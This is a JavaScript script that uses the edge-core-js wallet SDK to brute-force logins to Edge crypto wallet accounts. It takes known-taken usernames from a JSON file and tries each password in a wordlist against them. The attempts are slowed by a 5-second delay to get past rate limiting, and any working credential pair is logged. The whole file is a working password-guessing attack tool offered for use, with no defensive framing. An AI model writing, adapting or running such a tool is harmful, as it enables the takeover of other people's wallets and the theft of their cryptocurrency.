import fs from 'fs';
import { addEdgeCorePlugins, lockEdgeCorePlugins, makeEdgeContext } from 'edge-core-js';
import exchangePlugins from 'edge-exchange-plugins';

addEdgeCorePlugins(exchangePlugins, makeEdgeContext);
lockEdgeCorePlugins();

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

(async () => {
  const context = await makeEdgeContext({
    apiKey: '',
    appId: 'com.your-app',
    plugins: {
    },
  });

  // Read the usernames from the JSON file
  const usernames = JSON.parse(fs.readFileSync('unavailable_usernames.json', 'utf-8'));

  // Read the passwords from the text file
  const passwords = fs.readFileSync('passwords.txt', 'utf-8').replace(/\r\n/g, '\n').split('\n');

  let successfulLogin = false; // Flag to indicate successful login

  // Iterate through each username
  for (const username of usernames) {
    if (successfulLogin) break; // Stop if successful login

    console.log(`Trying passwords for username: ${username}`);

    // Try each password for the current username
    for (const password of passwords) {
      console.log(`Trying password: ${password}`);
      try {
        // Try to log in with the current username and password
        const account = await context.loginWithPassword(username, password);

        // If successful, log the username and password
        console.log(`Successful login: username=${username}, password=${password}`);
        successfulLogin = true; // Set flag to true
        break; // Move on to the next username
      } catch (error) {
        console.log(`Failed login attempt: username=${username}, password=${password}`);
        console.error('Error details:', error);
      }

      // Wait for 5 seconds before trying the next password
      await delay(5000);
    }
  }
})();
